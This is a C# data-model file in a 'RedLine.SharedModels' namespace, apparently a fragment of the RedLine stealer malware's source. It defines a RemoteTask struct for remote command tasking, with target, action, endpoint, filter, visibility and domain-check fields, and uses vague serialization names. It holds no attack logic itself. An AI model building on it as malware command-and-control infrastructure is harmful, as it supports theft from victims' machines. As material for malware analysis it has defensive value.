using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "RemoteTask")]
[DataContract(Name = "Entity6", Namespace = "Entity")]
public struct RemoteTask
{
	[ProtoMember(1, Name = "TaskId")]
	[DataMember(Name = "Id1")]
	public int ID { get; set; }

	[DataMember(Name = "Id2")]
	[ProtoMember(2, Name = "Target")]
	public string Target { get; set; }

	[ProtoMember(3, Name = "Action")]
	[DataMember(Name = "Id3")]
	public RemoteTaskAction Action { get; set; }

	[ProtoMember(4, Name = "FinalPoint")]
	[DataMember(Name = "FinalPoint")]
	public string FinalPoint { get; set; }

	[ProtoMember(5, Name = "Current")]
	[DataMember(Name = "Current")]
	public int Current { get; set; }

	[DataMember(Name = "Status")]
	[ProtoMember(6, Name = "Status")]
	public RemoteTaskStatus Status { get; set; }

	[ProtoMember(7, Name = "Filter")]
	[DataMember(Name = "Filter")]
	public string Filter { get; set; }

	[DataMember(Name = "Visible")]
	[ProtoMember(8, Name = "Visible")]
	public bool Visible { get; set; }

	[DataMember(Name = "Id4")]
	[ProtoMember(9, Name = "DomainsCheck")]
	public string DomainsCheck { get; set; }
}
